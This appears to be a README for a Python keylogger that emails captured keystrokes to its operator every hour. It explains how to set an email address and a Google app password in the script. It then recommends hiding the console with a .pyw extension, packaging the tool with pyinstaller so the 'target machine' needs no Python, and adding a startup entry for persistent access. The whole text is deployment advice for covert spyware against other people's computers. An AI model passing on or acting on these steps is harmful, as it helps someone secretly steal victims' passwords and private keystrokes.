## Key Logger Email
To use the Key Logger you will have to go into the file and set your **Email** and **API Key** on lines 7 and 8 <br />
```
EMAIL = "YOUR_EMAIL"
API_KEY = "YOUR_API_KEY"
```
Once set up deploy it on any machine then every single hour you will get a new report! <br />
### How to make an API Key
Open <a href="https://myaccount.google.com/apppasswords?utm_source=google-account&utm_medium=myaccountsecurity&utm_campaign=tsv-settings&rapt=AEjHL4MJWNwU_Z_E47TqShPhAMBe3prE0EcM2pN9ujvYzVVAfySDZvxJkm0Zamlm-MNAiPKlu3leOYDQ0zw_bJGRsTfVirF76A">App Passwords</a> in Google 2FA <br />
Press **Select App** then press pick any of your choosing then press **Generate**  <br />
Copy the code and keep that tab open just in case then paste it into your **API Key** then it will work 
# Recommendations
1. You should rename the file extension from **.py** to **.pyw** *(This hides the terminal)*
2. Run it through **pyinstaller** to make it an exe so you **don't need python installed in the target machine**
3. Make a startup file that boots up the exe or python file so you can always have access
